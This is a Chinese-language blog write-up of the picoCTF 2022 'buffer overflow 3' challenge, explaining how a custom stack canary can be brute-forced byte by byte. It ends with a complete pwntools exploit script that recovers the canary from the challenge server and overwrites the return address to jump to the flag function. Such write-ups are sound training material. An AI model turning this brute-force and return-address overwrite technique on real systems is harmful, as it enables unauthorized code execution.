---
layout: post
title: "picoCTF2022 buffer overflow 3 wp"
date:   2022-3-21
tags: [ctf_wp]
comments: true
author: wsxk
---

[题目附件](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-21-picoCTF2022_PWN_buffer_overflow3/vuln)

这道题其实不难，但是当时做的时候被挡住了。

这个故事告诉我们pwn是学无止境的

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-3-21-picoCTF2022_PWN_buffer_overflow3/1.png)

可以看到作者自定义了一个 canary

一开始我是不会做的，看到了提示，说有比较高效的方法可以爆破出canary的值

想了半天，如果要爆破canary，就是4字节的大整数，爆破就要爆半天了

后来仔细看题目

它一开始让我们输入 输入的字符串长度（buf的长度是64，人造canary就在其下面的位置）

我们可以输入65字节，然后输入64个'a'+一个字节的值（设为x），

如果输出stack smashing，说明x和canary的最低字节不相等

然而我们最多测试256次就能得到canary的最低字节

接下来我们输入66字节，输入64个'a'+得到的低字节canary+ 下一个字节的猜测

因此，实际上我们最多只要测256*4 = 1024次就可以得到完整的canary值


最后附上最后的exp

    from pwn import *

    #context(log_level='debug')
    canary = b''



    for i in range(4):
        for j in range(256):
            character = j
            #io = process('./vuln')
            io = remote('saturn.picoctf.net',49673)
            io.recvuntil("How Many Bytes will You Write Into the Buffer?")
            io.sendline(str(64+i+1))
            payload = b'w'*(64) + canary+bytes(chr(character).encode())
            io.recvuntil("Input>")
            io.sendline(payload)
            hint= io.recvline() 
            io.close()
            #print(b'hint: '+hint)
            #print(b"j:"+bytes(j))
            if b"Now Where's the Flag" in hint:
                canary += bytes(chr(character).encode())
                break

    print(canary)

    #canary = u32(canary)
    #io = process('./vuln')
    io = remote('saturn.picoctf.net',49673)
    io.recvuntil("How Many Bytes will You Write Into the Buffer?")
    io.sendline(str(100))
    payload = b'w'*(64) + canary+b'a'*16+p32(0x8049336)
    io.recvuntil("Input>")
    #gdb.attach(io)
    io.sendline(payload)
    io.interactive()